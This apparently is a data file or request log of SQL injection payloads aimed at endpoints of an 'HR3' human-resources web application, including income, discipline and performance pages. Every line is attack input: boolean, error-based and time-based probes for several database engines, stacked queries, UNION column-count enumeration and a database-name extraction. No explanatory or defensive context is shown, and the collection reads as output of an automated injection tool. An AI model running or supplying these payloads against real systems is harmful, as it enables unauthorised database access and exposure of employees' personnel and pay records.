+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 5351=1015 AND (2801=2801
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 1844=1844 AND (3833=3833
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 8745=7350 AND (5579=5579
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 7700=4817
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1844=1844
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1665=9693
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND (SELECT 9228 FROM(SELECT COUNT(*),CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (9228=9228) THEN 1 ELSE 0 END)),0x3a7a696a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a) AND (5793=5793
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND (SELECT 9228 FROM(SELECT COUNT(*),CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (9228=9228) THEN 1 ELSE 0 END)),0x3a7a696a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 8552=CAST((CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (8552=8552) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)) AS NUMERIC) AND (3512=3512
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 8552=CAST((CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (8552=8552) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)) AS NUMERIC)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 8564=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (8564=8564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58))) AND (3316=3316
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 8564=CONVERT(INT,(CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (8564=8564) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58)))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) AND 7337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (7337=7337) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL) AND (6725=6725
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 7337=(SELECT UPPER(XMLType(CHR(60)||CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (7337=7337) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)||CHR(62))) FROM DUAL)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1=1
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 AND 1=2
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	__EVENTTARGET=BtnOk&EmpID=766360' aNd 1=2 unIon all selEct cHar(94)+cHar(91)+db_name(0)+cHar(93)+cHar(94) --
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT (CHR(58)||CHR(102)||CHR(102)||CHR(121)||CHR(58))||(SELECT (CASE WHEN (5786=5786) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(106)||CHR(102)||CHR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT (CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (3149=3149) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT (CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58))||(SELECT (CASE WHEN (3923=3923) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT (CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58))||(SELECT (CASE WHEN (7480=7480) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT (CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58))||(SELECT (CASE WHEN (7759=7759) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58)))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHAR(58)+CHAR(102)+CHAR(102)+CHAR(121)+CHAR(58)+(SELECT (CASE WHEN (7828=7828) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(106)+CHAR(102)+CHAR(58))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHAR(58)+CHAR(106)+CHAR(113)+CHAR(100)+CHAR(58)+(SELECT (CASE WHEN (7890=7890) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(112)+CHAR(109)+CHAR(105)+CHAR(58))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHAR(58)+CHAR(110)+CHAR(104)+CHAR(119)+CHAR(58)+(SELECT (CASE WHEN (5644=5644) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(111)+CHAR(98)+CHAR(103)+CHAR(58))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHAR(58)+CHAR(111)+CHAR(104)+CHAR(102)+CHAR(58)+(SELECT (CASE WHEN (2852=2852) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(106)+CHAR(117)+CHAR(111)+CHAR(58))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHAR(58)+CHAR(118)+CHAR(103)+CHAR(106)+CHAR(58)+(SELECT (CASE WHEN (7770=7770) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(118)+CHAR(99)+CHAR(107)+CHAR(58))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHR(58)||CHR(102)||CHR(102)||CHR(121)||CHR(58)||(SELECT (CASE WHEN (4758=4758) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(106)||CHR(102)||CHR(58) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58)||(SELECT (CASE WHEN (9825=9825) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHR(58)||CHR(110)||CHR(104)||CHR(119)||CHR(58)||(SELECT (CASE WHEN (6131=6131) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(111)||CHR(98)||CHR(103)||CHR(58) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHR(58)||CHR(111)||CHR(104)||CHR(102)||CHR(58)||(SELECT (CASE WHEN (7318=7318) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(106)||CHR(117)||CHR(111)||CHR(58) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CHR(58)||CHR(118)||CHR(103)||CHR(106)||CHR(58)||(SELECT (CASE WHEN (4755=4755) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(118)||CHR(99)||CHR(107)||CHR(58) FROM DUAL)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CONCAT(0x3a6666793a,(SELECT (CASE WHEN (1098=1098) THEN 1 ELSE 0 END)),0x3a7a6a663a))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CONCAT(0x3a6a71643a,(SELECT (CASE WHEN (6338=6338) THEN 1 ELSE 0 END)),0x3a706d693a))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CONCAT(0x3a6e68773a,(SELECT (CASE WHEN (6399=6399) THEN 1 ELSE 0 END)),0x3a6f62673a))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CONCAT(0x3a6f68663a,(SELECT (CASE WHEN (3850=3850) THEN 1 ELSE 0 END)),0x3a6a756f3a))
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=(SELECT CONCAT(0x3a76676a3a,(SELECT (CASE WHEN (3627=3627) THEN 1 ELSE 0 END)),0x3a76636b3a))
+/HR3/UserGuide/index.aspx	FunctionCode=Lzh.Income.Operate' AND 8347=(SELECT 8347 FROM PG_SLEEP(5)) AND 'BeoO'='BeoO
+/HR3/UserGuide/Content/HROnly/Security/SecurityLeft.htm	FunctionCode=Lzh.Income.Operate AND 9883=CAST((CHR(58)||CHR(106)||CHR(113)||CHR(100)||CHR(58))||(SELECT (CASE WHEN (9883=9883) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(112)||CHR(109)||CHR(105)||CHR(58)) AS NUMERIC)
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate); SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	FunctionCode=Lzh.Income.Operate); SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	FunctionCode=Lzh.Income.Operate; SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/right.htm	FunctionCode=Lzh.Income.Operate; SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/Left.htm	FunctionCode=Lzh.Income.Operate; SELECT PG_SLEEP(5)--
+/HR3/UserGuide/HLP/Top.htm	FunctionCode=Lzh.Income.Operate'; SELECT PG_SLEEP(5)--
+/hr3/personnel/lzh/lzhdisciplineedit.aspx	FunctionCode=Lzh.Income.Operate'; SELECT PG_SLEEP(5)--
+/hr3/personnel/lzh/LzhReportEdit.aspx	FunctionCode=Lzh.Income.Operate; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	FunctionCode=Lzh.Income.Operate; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	FunctionCode=Lzh.Income.Operate'; SELECT SLEEP(5)-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT (CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58))||(SELECT (CASE WHEN (4344=4344) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58)))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT (CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58))||(SELECT (CASE WHEN (1689=1689) THEN 1 ELSE 0 END))::text||(CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58)))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CHAR(58)+CHAR(105)+CHAR(110)+CHAR(109)+CHAR(58)+(SELECT (CASE WHEN (4482=4482) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(122)+CHAR(105)+CHAR(106)+CHAR(58))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CHAR(58)+CHAR(108)+CHAR(117)+CHAR(97)+CHAR(58)+(SELECT (CASE WHEN (8663=8663) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(58)+CHAR(100)+CHAR(112)+CHAR(117)+CHAR(58))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CHR(58)||CHR(105)||CHR(110)||CHR(109)||CHR(58)||(SELECT (CASE WHEN (6319=6319) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(122)||CHR(105)||CHR(106)||CHR(58) FROM DUAL)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CHR(58)||CHR(108)||CHR(117)||CHR(97)||CHR(58)||(SELECT (CASE WHEN (4552=4552) THEN 1 ELSE 0 END) FROM DUAL)||CHR(58)||CHR(100)||CHR(112)||CHR(117)||CHR(58) FROM DUAL)
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CONCAT(0x3a696e6d3a,(SELECT (CASE WHEN (5022=5022) THEN 1 ELSE 0 END)),0x3a7a696a3a))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=(SELECT CONCAT(0x3a6c75613a,(SELECT (CASE WHEN (6530=6530) THEN 1 ELSE 0 END)),0x3a6470753a))
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL#
+/hr3/performance/gfa/gfayearworks.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/hr3/performance/gfa/gfayearworks.aspx	oper=m&recid=101536') LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) LIMIT 0,1 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) UNION ALL SELECT NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL-- 
+/HR3/Personnel/Lzh/LzhIncomeEdit.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/HR3/UserGuide/HLP/HlpCopyEntryList.aspx	oper=m&recid=101536') UNION ALL SELECT NULL,NULL,NULL,NULL,NULL-- 
+/hr3/performance/gfa/gfayearworks.aspx	oper=m&recid=101536) UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL-- 
